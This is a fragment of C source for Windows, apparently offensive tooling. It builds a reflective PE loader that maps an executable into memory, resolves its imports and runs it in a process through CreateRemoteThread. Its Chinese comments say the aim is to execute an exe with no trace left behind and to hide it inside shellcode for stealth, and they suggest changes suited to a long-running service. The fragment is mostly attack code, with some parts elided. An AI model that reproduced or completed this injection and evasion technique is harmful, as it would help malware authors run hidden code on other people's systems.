...
typedef struct _FUNCTION {
    ...
    FN_GetCurrentProcess        fn_GetCurrentProcess;
    FN_WaitForSingleObject      fn_WaitForSingleObject;
}FUNCTION, *PFUNCTION;
void InitFunctions(PFUNCTION pFn){
    ...
    pFn->fn_GetCurrentProcess         = (FN_GetCurrentProcess)       pFn->fn_GetProcAddress(pFn->fn_LoadLibraryA(szKernel32), szGetCurrentProcess);
    pFn->fn_WaitForSingleObject       = (FN_WaitForSingleObject)     pFn->fn_GetProcAddress(pFn->fn_LoadLibraryA(szKernel32), szWaitForSingleObject);
...
void AdjustPE(LPE_INFO pe) {
    ...
    ULONGLONG*                  p,delta;
    BOOL        (*EXE_Entry)    (LPVOID, DWORD, LPVOID);
    LPVOID      (*Load_EXE)     (LPSTR);
    LPVOID      (*Get_Proc)     (LPVOID, LPSTR);
    base       = pe->base;
    Load_EXE   = pe->Load_EXE;
    ...
    if(nt->OptionalHeader.DataDirectory[1].VirtualAddress != 0){
        ...
        while(import->Name) {
            LPVOID dll = (*Load_EXE)(base+import->Name);
    ...
    (*EXE_Entry)(base,DLL_PROCESS_ATTACH,NULL);
}
void loadexerun(PFUNCTION pFn){
    int i;
    HANDLE      proc;
    HANDLE      hThread;
    ...
    // 加载一个 exe 程序到内存，直接在内存里面执行，不留痕迹的执行一个 exe 程序
    // 如果将这里的读取内存步骤直接省略，将 exe 以 unsigned char[] 的形式打包进来，
    //   那就相当于将一个 exe 程序打包进了一个 shellcode 里面
    // 既有 exe 程序的开发调试的便利性，又能利用 shellcode 的隐蔽性。
    // 因为是通过开新线程执行内存内的 exe 程序，所以如果宿主程序执行比较久/并且你也是一个服务式的程序可以考虑注释掉 pFn->fn_WaitForSingleObject 函数防止程序卡住。
    char dllfilename[] = {'t','e','s','t','e','x','e','.','e','x','e','\0'};
    ...
    Func_Size = (DWORD)((ULONGLONG)loadexerun-(ULONGLONG)AdjustPE);
    pe.base = Rbase;
    pe.Get_Proc = pFn->fn_GetProcAddress;
    pe.Load_EXE = pFn->fn_LoadLibraryA;
    ...
    hThread = pFn->fn_CreateRemoteThread(proc, NULL, 0, (LPTHREAD_START_ROUTINE)(Adj+sizeof(pe)), Adj, 0, NULL);
    pFn->fn_WaitForSingleObject(hThread, INFINITE); // 视个人情况决定是否注释掉这行代码。
    return;
}
